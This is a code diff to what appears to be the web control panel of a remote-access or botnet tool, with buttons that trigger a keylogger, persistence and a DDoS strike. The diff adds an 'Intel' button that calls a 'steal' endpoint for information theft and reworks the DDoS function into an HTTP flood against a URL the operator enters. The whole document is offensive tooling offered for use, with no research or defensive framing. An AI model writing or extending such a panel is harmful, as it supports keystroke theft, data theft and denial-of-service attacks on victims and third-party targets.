@@ -142,6 +142,7 @@
                     <button onclick="startKeylogger()" class="btn-action bg-zinc-900 border border-yellow-500/50 text-yellow-500 p-2 rounded hover:bg-yellow-500/10">⌨️ Keys</button>
                     <button onclick="addPersistence()" class="btn-action bg-zinc-900 border border-purple-500/50 text-purple-500 p-2 rounded hover:bg-purple-500/10">🔒 Anchor</button>
                     <button onclick="startDDoS()" class="btn-action bg-zinc-900 border border-red-500/50 text-red-500 p-2 rounded hover:bg-red-500/10">☠️ Strike</button>
+                    <button onclick="stealInfo()" class="btn-action bg-zinc-900 border border-blue-500/50 text-blue-500 p-2 rounded hover:bg-blue-500/10">🔍 Intel</button>
                 </div>
             </div>
         </div>
@@ -412,15 +413,17 @@
         function addPersistence() { apiTrigger('persistence'); }
         
         function startDDoS() {
-            const target = prompt("Target Host (IP/Domain)", "8.8.8.8");
+            const target = prompt("Target URL for HTTP flood (include http/https)", "http://example.com");
             if (!target) return;
-            const type = prompt("Attack Vector (udp / syn / http)", "udp");
-            if (!type) return;
-            
-            fetch(`/ddos?target=${encodeURIComponent(target)}&attack_type=${type}&duration=60`, { method: 'POST' })
-                .then(r => r.json())
-                .then(d => alert("Attack Sequence Initiated"))
-                .catch(e => alert("Communication Error"));
+            apiTrigger(`ddos?target=${encodeURIComponent(target)}`);
+            const term = document.getElementById('terminal');
+            term.innerHTML += `<div class="info mt-2"> [SYSTEM] DDoS Attack initiated against ${target}</div>`;
+        }
+
+        function stealInfo() {
+            apiTrigger('steal');
+            const term = document.getElementById('terminal');
+            term.innerHTML += `<div class="info mt-2"> [SYSTEM] Requesting system report...</div>`;
         }
 
         // Initialize
